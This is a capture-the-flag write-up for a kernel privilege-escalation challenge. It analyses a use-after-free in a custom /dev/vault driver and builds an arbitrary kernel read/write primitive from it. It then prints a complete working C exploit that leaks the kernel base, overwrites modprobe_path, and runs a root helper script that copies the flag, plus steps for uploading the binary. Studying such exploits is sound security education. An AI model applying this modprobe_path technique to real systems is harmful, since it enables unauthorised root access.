## Challenge

> PWN#007 — 142 points. Get root inside the VM and read the flag.

The handout boots a Linux 6.1.176 kernel under QEMU:

```sh
qemu-system-x86_64 -kernel bzImage -initrd initramfs.cpio.gz \
    -append "console=ttyS0 panic=1 quiet" \
    -nographic -no-reboot -m 256M -cpu qemu64,+smep,-smap
```

`init` writes the flag to `/root/flag.txt` (`0400 root:root`), truncates itself so the flag cannot be recovered from `/init`, and drops to an unprivileged `user` shell via `su`. KASLR is on, SMEP is on, SMAP is off. There are no `.ko` files in the initramfs, so the vulnerable code is linked directly into `vmlinux`.

## Analysis

### Finding the attack surface

The kernel is not stripped, so the driver falls out of a symbol scan:

```text
$ nm vmlinux | grep -i vault
ffffffff8156ef80 t vault_default_notify
ffffffff8156ef90 t vault_open
ffffffff8156efa0 t vault_ioctl
ffffffff8156f320 t vault_release
ffffffff829cdb40 d vault_dev
ffffffff82283e80 d vault_fops
ffffffff83015093 t vault_init
```

`vault_init` is a single `misc_register(&vault_dev)`; the `miscdevice` at `0xffffffff829cdb40` holds `minor = MISC_DYNAMIC_MINOR` and `name = "vault"`, so the node is `/dev/vault` (created by `devtmpfs`). `open` and `release` are no-ops; all of the logic is in `vault_ioctl`.

### The ioctl surface

Disassembling `vault_ioctl` recovers six commands and a global 16-entry table:

| Command | Name | Argument | Behaviour |
|---|---|---|---|
| `0x40085601` | CREATE | `{u32 idx; u32 size;}` | `kmalloc(size)` for the data buffer, `kmalloc(0x20)` for the entry; `1 <= size <= 0x1000`; the slot must be empty |
| `0x40045602` | DELETE | `{u32 idx;}` | `kfree(entry->buf)` then `kfree(entry)` |
| `0x40105603` | READ | `{u32 idx; u32 size; u64 userptr;}` | `copy_to_user(userptr, entry->buf, size)` |
| `0x40105604` | WRITE | `{u32 idx; u32 size; u64 userptr;}` | `copy_from_user(entry->buf, userptr, size)` |
| `0x40045605` | CALL | `{u32 idx;}` | `entry->callback(entry->arg)` |
| `0x80085606` | LEAK | `u64 *` | returns `&vault_ioctl` |

READ and WRITE both reject a request larger than the entry's recorded size, and sizes above `0x7fffffff` hit a `ud2` in the hardened `copy_*` helpers.

The entry layout is:

```c
struct vault_entry {          /* kmalloc-32 */
    u64 callback;   /* 0x00  KEY ^ &vault_default_notify */
    u64 arg;        /* 0x08 */
    u64 size;       /* 0x10  zero-extended from the u32 ioctl argument */
    void *buf;      /* 0x18  kmalloc(size, GFP_KERNEL) */
};
static struct vault_entry *slots[16];   /* 0xffffffff8328c220 */
```

The callback field is lightly obfuscated with `KEY = 0x6f6f56e06f2d7f60`: CREATE stores `KEY ^ &vault_default_notify` and CALL invokes `KEY ^ entry->callback`. Since `vault_default_notify` is a no-op returning 0, the CALL path is inert unless the field is overwritten — which is exactly what the UAF below allows.

### The bug

DELETE frees both allocations but never clears the table entry:

```c
case VAULT_DELETE:
    if (idx > 15) return -EINVAL;
    e = slots[idx];
    if (!e) return -EINVAL;
    kfree(e->buf);
    kfree(e);          /* slots[idx] left dangling */
    return 0;
```

That is a use-after-free (and a double-free, since DELETE can be issued twice) on the 32-byte entry chunk in `kmalloc-32`. Because CREATE refuses a non-empty slot, the dangling pointer cannot be refreshed — but it does not need to be.

### From dangling pointer to arbitrary kernel R/W

The freed entry is a `kmalloc-32` object, and CREATE allocates the data buffer with the same allocator. SLUB's per-CPU freelist is LIFO, so a 32-byte buffer allocated right after the free reuses the exact chunk the dangling slot points at:

1. `CREATE(0, 0x1000)` — slot 0 gets entry `A` and a 4 KB buffer.
2. `DELETE(0)` — `A->buf` and `A` are freed; `slots[0]` still equals `A`.
3. `CREATE(1, 32)` — slot 1's 32-byte data buffer is allocated at `A`; `slots[0]` and `slots[1]->buf` now alias.
4. `WRITE(1, fake, 32)` — writes 32 attacker bytes into `A`, i.e. into the fake entry that `slots[0]` still points at.
5. `READ(0, ...)` / `WRITE(0, ...)` — slot 0 now has `size = 0x7fffffff` and `buf = target`, so the ioctl performs a `copy_*` against an arbitrary kernel address.

Setting `size` to `0x7fffffff` is the largest value accepted before the `ud2` guard, and it is enough for every access used here.

### KASLR

`LEAK` copies `&vault_ioctl` to user space, so the slide is simply `leak - 0x56efa0`. The two symbols needed afterwards are at fixed offsets from `0xffffffff81000000`:

```text
vault_ioctl     0xffffffff8156efa0   (+0x56efa0)
modprobe_path   0xffffffff82851a60   (+0x1851a60)
```

## Exploit

The whole chain is: leak, stage the UAF, point `modprobe_path` at a shell script, then execute a file with an unknown binary format so the kernel runs the helper as root.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define DEV "/dev/vault"

#define IOCTL_CREATE 0x40085601UL
#define IOCTL_DELETE 0x40045602UL
#define IOCTL_READ   0x40105603UL
#define IOCTL_WRITE  0x40105604UL
#define IOCTL_LEAK   0x80085606UL

#define OFF_VAULT_IOCTL 0x56efa0ULL
#define OFF_MODPROBE    0x1851a60ULL

static int fd = -1;

struct req  { uint32_t idx; uint32_t size; uint64_t ptr; };
struct creq { uint32_t idx; uint32_t size; };

static int vcreate(int idx, uint32_t size) {
    struct creq c; c.idx = idx; c.size = size;
    return ioctl(fd, IOCTL_CREATE, &c);
}
static int vdelete(int idx) {
    uint32_t i = idx;
    return ioctl(fd, IOCTL_DELETE, &i);
}
static int vread(int idx, void *buf, uint32_t size) {
    struct req r; r.idx = idx; r.size = size; r.ptr = (uint64_t)buf;
    return ioctl(fd, IOCTL_READ, &r);
}
static int vwrite(int idx, const void *buf, uint32_t size) {
    struct req r; r.idx = idx; r.size = size; r.ptr = (uint64_t)buf;
    return ioctl(fd, IOCTL_WRITE, &r);
}

/* Overwrite the chunk slot 0 dangles on with a fake vault_entry. */
static void set_fake(uint64_t target) {
    uint64_t fake[4] = { 0, 0, 0x7fffffffULL, target };
    if (vwrite(1, fake, 32) != 0) { perror("vwrite fake"); exit(1); }
}
static void arb_read(uint64_t addr, void *dst, uint32_t n) {
    set_fake(addr);
    if (vread(0, dst, n) != 0) { perror("arb_read"); exit(1); }
}
static void arb_write(uint64_t addr, const void *src, uint32_t n) {
    set_fake(addr);
    if (vwrite(0, src, n) != 0) { perror("arb_write"); exit(1); }
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] uid=%d\n", getuid());

    fd = open(DEV, O_RDWR);
    if (fd < 0) { perror("open " DEV); return 1; }

    uint64_t leak = 0;
    if (ioctl(fd, IOCTL_LEAK, &leak) != 0) { perror("leak"); return 1; }
    uint64_t kbase = leak - OFF_VAULT_IOCTL;
    uint64_t modprobe = kbase + OFF_MODPROBE;
    printf("[+] vault_ioctl = %#lx, base = %#lx\n",
           (unsigned long)leak, (unsigned long)kbase);

    /* Stage the UAF: slot 0 dangles on a freed kmalloc-32 entry, then a
       32-byte data buffer is allocated on top of that same chunk. */
    if (vcreate(0, 0x1000) != 0) { perror("create0"); return 1; }
    if (vdelete(0) != 0) { perror("delete0"); return 1; }
    if (vcreate(1, 32) != 0) { perror("create1"); return 1; }

    char chk[32] = {0};
    arb_read(modprobe, chk, 16);
    printf("[+] modprobe_path = %#lx currently '%s'\n",
           (unsigned long)modprobe, chk);

    arb_write(modprobe, "/tmp/x", 7);
    memset(chk, 0, sizeof(chk));
    arb_read(modprobe, chk, 16);
    printf("[+] modprobe_path now '%s'\n", chk);

    /* Helper runs as root; drop the flag where user can read it. */
    system("printf '#!/bin/sh\ncat /root/flag.txt > /tmp/flag\nchmod 666 /tmp/flag\n' > /tmp/x");
    chmod("/tmp/x", 0777);

    /* Unknown binary format -> request_module("binfmt-ffff") -> modprobe. */
    int f = open("/tmp/dummy", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    if (f >= 0) { write(f, "\xff\xff\xff\xff", 4); close(f); }
    chmod("/tmp/dummy", 0777);

    pid_t p = fork();
    if (p == 0) {
        char *argv[] = { "/tmp/dummy", NULL };
        char *envp[] = { NULL };
        execve("/tmp/dummy", argv, envp);
        _exit(0);
    }
    int st; waitpid(p, &st, 0);
    sleep(1);

    printf("[*] --- flag ---\n");
    system("cat /tmp/flag 2>/dev/null; cat /root/flag.txt 2>/dev/null");
    printf("\n[*] done, uid=%d\n", getuid());
    return 0;
}
```

### Getting it to the remote

The service hands out a fresh VM per TCP connection, so the payload has to be uploaded and executed inside the same session. To keep the transfer small the same logic was rebuilt without libc (`-nostdlib`, raw `syscall`) and shipped gzip+base64 (1.6 KB):

```sh
gcc -Os -static -nostdlib -ffreestanding -fno-builtin -fno-stack-protector \
    -fno-pie -no-pie -o exp exp.c
gzip -9 -c exp | base64 -w76 > exp.b64
```

```text
/ $ base64 -d >/tmp/e.gz <<'XEOF'
...payload...
XEOF
/ $ gunzip -c /tmp/e.gz > /tmp/e; chmod +x /tmp/e; /tmp/e
[*] opened /dev/vault
[+] kernel base leaked
[+] UAF staged
[+] modprobe_path -> /tmp/x
[*] triggering modprobe
[*] flag: CTF{15481775abf9a27438577c295fd1a4a1}
[*] done
```

### Notes

- The `_IOW` size field in the CREATE command is 8 (two u32), so the request is `0x40085601`, not `0x40045601`. Sending the wrong value returns `ENOTTY` and looks like a dead driver.
- `smep` is enabled but irrelevant here: no control flow is hijacked, the primitive is pure data access.
- The same fake entry can drive the CALL command (`callback = KEY ^ target`, `arg` in `rdi`) for a one-shot indirect call, but the arbitrary read/write path is strictly more flexible.
